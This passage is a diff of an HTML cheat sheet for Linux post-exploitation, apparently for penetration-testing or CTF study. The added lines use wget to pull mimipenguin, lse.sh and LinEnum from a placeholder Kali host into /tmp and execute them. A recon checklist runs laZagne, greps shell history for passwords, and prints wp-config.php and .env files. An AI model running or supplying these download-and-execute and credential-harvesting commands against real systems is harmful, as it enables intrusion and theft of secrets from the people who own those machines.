+<pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/linux/mimipenguin.py -O /tmp/mimipenguin.py
+wget http://{{KALI_IP}}:{{PORT}}/linux/mimipenguin.sh -O /tmp/mimipenguin.sh && chmod +x /tmp/mimipenguin.sh</pre></div>
+<div class="cmd-wrap"><pre class="cmd">python3 /tmp/mimipenguin.py    # Python version (most compatible)
+bash /tmp/mimipenguin.sh        # Bash version
 # What it targets:
 # - gnome-keyring (GNOME keyring daemon)
 # - vsftpd (FTP plaintext creds)
@@ -5362,17 +5475,21 @@ bash mimipenguin.sh        # Bash version
 <div class="tool-card">
 <div class="tool-name">linux-smart-enum (lse.sh)</div><div class="tool-cat">Smart Enumeration — Focused Output</div>
 <div class="tool-desc">Better than LinPEAS for targeted checks. Levels 0-2 control verbosity. Level 2 = everything.</div>
-<div class="cmd-wrap"><pre class="cmd">./lse.sh -l 0    # critical findings only
-./lse.sh -l 1    # important
-./lse.sh -l 2    # all findings (noisy but thorough)
-./lse.sh -i      # interactive mode, ask for sudo password if available</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download to target first (Kali HTTP server must be running)</div>
+<pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/linux/lse.sh -O /tmp/lse.sh && chmod +x /tmp/lse.sh</pre></div>
+<div class="cmd-wrap"><pre class="cmd">/tmp/lse.sh -l 0    # critical findings only
+/tmp/lse.sh -l 1    # important
+/tmp/lse.sh -l 2    # all findings (noisy but thorough)
+/tmp/lse.sh -i      # interactive mode, ask for sudo password if available</pre></div>
 </div>
 <div class="tool-card">
 <div class="tool-name">LinEnum</div><div class="tool-cat">Legacy but Thorough</div>
 <div class="tool-desc">Older but still finds things LinPEAS misses in some areas — config files, user info, SUID binaries.</div>
-<div class="cmd-wrap"><pre class="cmd">./LinEnum.sh -t              # thorough mode
-./LinEnum.sh -t -r report    # save to report file
-./LinEnum.sh -s              # supply sudo password interactively</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download to target first (Kali HTTP server must be running)</div>
+<pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/linux/LinEnum.sh -O /tmp/LinEnum.sh && chmod +x /tmp/LinEnum.sh</pre></div>
+<div class="cmd-wrap"><pre class="cmd">/tmp/LinEnum.sh -t              # thorough mode
+/tmp/LinEnum.sh -t -r report    # save to report file
+/tmp/LinEnum.sh -s              # supply sudo password interactively</pre></div>
 </div>
 </div>
 </div>
@@ -5412,7 +5529,7 @@ find /etc -writable -type f 2>/dev/null   # writable /etc files = critical</pre>
 <div class="callout callout-warn" style="margin-top:12px">
 <strong>&#9989; Linux Deep Recon Checklist — Run ALL before declaring "stuck"</strong>
 <ul style="margin:6px 0 0 16px;line-height:2">
-  <li><code>python3 laZagne.py all</code></li>
+  <li><code>python3 /tmp/laZagne.py all</code></li>
   <li><code>find /home /root -name ".*" 2>/dev/null | xargs ls -la 2>/dev/null</code></li>
   <li><code>cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE "pass|secret|ssh|mysql"</code></li>
   <li><code>find / -name "wp-config.php" -o -name ".env" 2>/dev/null | xargs cat 2>/dev/null</code></li>
